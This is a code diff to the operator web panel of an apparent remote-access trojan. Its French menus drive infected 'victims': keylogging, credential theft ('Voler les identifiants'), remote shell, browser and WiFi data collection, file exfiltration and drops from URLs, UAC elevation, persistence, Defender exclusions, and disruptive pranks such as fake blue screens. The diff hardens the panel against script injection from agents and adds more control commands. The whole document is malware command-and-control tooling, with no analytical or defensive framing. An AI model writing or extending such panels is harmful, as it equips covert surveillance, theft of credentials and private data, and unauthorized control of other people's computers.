@@ -15,6 +15,18 @@ const state = {
 
 const $ = (id) => document.getElementById(id);
 
+// Every string below this line comes from an agent, and an agent is whatever is
+// running on the other machine. Unescaped, a filename like
+// `<img src=x onerror=...>` runs in the operator's session and can queue
+// commands against every other victim.
+const esc = (v) =>
+  String(v == null ? "" : v)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;");
+
 async function api(path, opts) {
   const res = await fetch(path, Object.assign({ credentials: "same-origin" }, opts || {}));
   if (res.status === 401) {
@@ -105,16 +117,16 @@ function render() {
     if (state.selected === v.id) tr.className = "sel";
     const st = statusOf(v);
     tr.innerHTML = `
-      <td><span class="dot ${st}"></span>${v.host || "?"}</td>
-      <td>${v.username || "-"}</td>
-      <td>${v.os || "-"}</td>
-      <td>${v.country || "-"}</td>
-      <td>${v.ip || "-"}</td>
+      <td><span class="dot ${st}"></span>${esc(v.host || "?")}</td>
+      <td>${esc(v.username || "-")}</td>
+      <td>${esc(v.os || "-")}</td>
+      <td>${esc(v.country || "-")}</td>
+      <td>${esc(v.ip || "-")}</td>
       <td>${v.admin ? '<span class="tag admin">ADMIN</span>' : '<span class="tag">user</span>'}</td>
-      <td>${(v.active_window || "-").replace(/</g, "&lt;")}</td>
-      <td>${v.ping_ms || 0} ms</td>
-      <td>${seen(v.idle)}</td>
-      <td>${v.tag || ""}</td>`;
+      <td>${esc(v.active_window || "-")}</td>
+      <td>${Number(v.ping_ms) || 0} ms</td>
+      <td>${seen(Number(v.idle) || 0)}</td>
+      <td>${esc(v.tag || "")}</td>`;
     tr.addEventListener("mousedown", (e) => {
       if (e.button === 2) {
         state.selected = v.id;
@@ -155,32 +167,40 @@ const MODULES = [
     label: "Système",
     items: [
       { label: "Informations", verb: "info" },
-      { label: "Processus", verb: "process_list" },
+      { label: "Posture / privilèges", verb: "status" },
+      { label: "Processus", verb: "ps" },
       { label: "Services", verb: "service_list" },
       { label: "Démarrage", verb: "startup_list" },
       { label: "Tâches planifiées", verb: "task_list" },
-      { label: "Registre", verb: "registry_list" }
+      { label: "Registre (Run)", verb: "registry_list" },
+      { label: "Disques", verb: "drives" },
+      { label: "Antivirus", verb: "av" }
     ]
   },
   {
     label: "Fichiers",
     items: [
-      { label: "Gestionnaire", verb: "ls", args: "" },
-      { label: "Bureau", verb: "ls", args: "%USERPROFILE%\\Desktop" },
-      { label: "Documents", verb: "ls", args: "%USERPROFILE%\\Documents" },
-      { label: "Téléchargements", verb: "ls", args: "%USERPROFILE%\\Downloads" },
-      { label: "Exécuter…", verb: "exec", prompt: "chemin du fichier à exécuter" }
+      { label: "Explorateur", verb: "ls", args: "" },
+      { label: "Bureau", verb: "ls", args: "%USERPROFILE%\Desktop" },
+      { label: "Documents", verb: "ls", args: "%USERPROFILE%\Documents" },
+      { label: "Téléchargements", verb: "ls", args: "%USERPROFILE%\Downloads" },
+      { label: "Changer de dossier", verb: "cd", prompt: "chemin du dossier" },
+      { label: "Exécuter", verb: "run", prompt: "chemin du fichier" },
+      { label: "Récupérer un fichier", verb: "download", prompt: "chemin complet" },
+      { label: "Déposer depuis une URL", verb: "upload", prompt: "url puis chemin" },
+      { label: "Fichier hosts", verb: "hosts" }
     ]
   },
   {
     label: "Surveillance",
     items: [
-      { label: "Capture d'écran", verb: "screenshot" },
-      { label: "Presse-papiers", verb: "clipboard" },
-      { label: "Keylogger ▸ démarrer", verb: "keylog_start" },
-      { label: "Keylogger ▸ arrêter", verb: "keylog_stop" },
-      { label: "Keylogger ▸ dump", verb: "keylog_dump" },
-      { label: "Webcam (si présente)", verb: "webcam_snap" }
+      { label: "Capture d'écran", verb: "screen" },
+      { label: "Rafale (3 frames)", verb: "burst", args: "3" },
+      { label: "Presse-papiers", verb: "clip" },
+      { label: "Keylogger ▸ démarrer", verb: "keylog", args: "on" },
+      { label: "Keylogger ▸ arrêter", verb: "keylog", args: "off" },
+      { label: "Keylogger ▸ dump", verb: "keylog", args: "dump" },
+      { label: "Keylogger ▸ effacer", verb: "keylog", args: "clear" }
     ]
   },
   {
@@ -188,14 +208,15 @@ const MODULES = [
     items: [
       { label: "Shell", verb: "shell", prompt: "commande" },
       { label: "WiFi", verb: "wifi" },
-      { label: "Navigateurs", verb: "browsers" },
-      { label: "Fichier hosts", verb: "hosts" }
+      { label: "Connexions", verb: "netstat" },
+      { label: "Navigateurs", verb: "browsers" }
     ]
   },
   {
     label: "Récupération",
     items: [
       { label: "Voler les identifiants", verb: "steal" },
+      { label: "État du bundle", verb: "zipinfo" },
       { label: "Lister les fichiers reçus", verb: "_uploads" },
       { label: "Historique des commandes", verb: "_history" }
     ]
@@ -204,6 +225,7 @@ const MODULES = [
     label: "Élévation",
     items: [
       { label: "Chaîne UAC", verb: "elevate" },
+      { label: "Reprendre la session en high", verb: "reclaim" },
       { label: "Réinstaller la persistance", verb: "persist" },
       { label: "Extension navigateur", verb: "ext" },
       { label: "Exclusions Defender", verb: "defender" }
@@ -213,11 +235,31 @@ const MODULES = [
     label: "Contrôle",
     items: [
       { label: "Chat", verb: "_chat" },
-      { label: "Message box", verb: "msgbox", prompt: "texte affiché" },
-      { label: "Visiter une URL", verb: "visit", prompt: "https://…" },
-      { label: "Éteindre", verb: "shutdown" },
-      { label: "Redémarrer", verb: "reboot" },
-      { label: "BSOD factice", verb: "bsod" }
+      { label: "Message box", verb: "msg", prompt: "texte affiché" },
+      { label: "Ouvrir une URL", verb: "open", prompt: "https://…" },
+      { label: "Recherche Google", verb: "search", prompt: "requête" },
+      { label: "Fond d'écran", verb: "wallpaper", prompt: "url ou chemin" },
+      { label: "Volume +", verb: "volume", args: "up" },
+      { label: "Volume -", verb: "volume", args: "down" },
+      { label: "Muet", verb: "volume", args: "mute" },
+      { label: "Faire parler", verb: "say", prompt: "texte" },
+      { label: "Taper du texte", verb: "type", prompt: "texte" },
+      { label: "Écrans éteints", verb: "monitors" },
+      { label: "Rotate 90", verb: "rotate", args: "90" },
+      { label: "Rotate 0", verb: "rotate", args: "0" },
+      { label: "Couleurs inversées", verb: "invert", args: "on" },
+      { label: "Couleurs normales", verb: "invert", args: "off" },
+      { label: "Barre des tâches ▸ cacher", verb: "taskbar", args: "hide" },
+      { label: "Barre des tâches ▸ rendre", verb: "taskbar", args: "show" },
+      { label: "Serpent", verb: "snake", args: "60" },
+      { label: "Rickroll", verb: "rickroll" },
+      { label: "Écran factice", verb: "decoy", args: "150" },
+      { label: "Écran de verrouillage", verb: "power", args: "lock" },
+      { label: "Flotte", verb: "fleet" },
+      { label: "Blue screen factice", verb: "bsod", args: "90" },
+      { label: "Éteindre", verb: "power", args: "shutdown" },
+      { label: "Redémarrer", verb: "power", args: "restart" },
+      { label: "Désinstaller", verb: "uninstall" }
     ]
   }
 ];
@@ -337,8 +379,8 @@ function makeWindow(key, title, subtitle, onClose) {
   el.style.zIndex = ++zi;
   el.innerHTML = `
     <div class="bar">
-      <div class="name">${title}</div>
-      <div class="vid">${subtitle}</div>
+      <div class="name">${esc(title)}</div>
+      <div class="vid">${esc(subtitle)}</div>
       <button class="x">×</button>
     </div>
     <div class="body"></div>`;
@@ -412,7 +454,7 @@ function openHistory(victim) {
     win.body.innerHTML = "<pre class='out'>" + data.commands.map((c) => {
       const t = new Date(c.created).toLocaleTimeString("fr-FR");
       const st = c.finished ? "ok" : c.dispatched ? "…" : "file";
-      return `${t}  ${String(c.id).padStart(5)}  ${st.padEnd(4)}  ${c.verb} ${c.args}`;
+      return `${t}  ${String(c.id).padStart(5)}  ${st.padEnd(4)}  ${esc(c.verb)} ${esc(c.args)}`;
     }).join("\n") + "</pre>";
   };
   win.poll = poll;
@@ -430,9 +472,9 @@ function openUploads(victim) {
     }
     win.body.innerHTML = "<table style='width:100%'><tbody>" +
       data.uploads.map((u) =>
-        `<tr><td>${u.created.slice(0, 19).replace("T", " ")}</td>
-             <td>${u.name}</td>
-             <td>${(u.bytes / 1024).toFixed(1)} Ko</td>
+        `<tr><td>${esc(String(u.created).slice(0, 19).replace("T", " "))}</td>
+             <td>${esc(u.name)}</td>
+             <td>${(Number(u.bytes) / 1024).toFixed(1)} Ko</td>
              <td><a style="color:#6cb6ff" href="/api/download?id=${u.id}">télécharger</a></td></tr>`)
         .join("") + "</tbody></table>";
   };
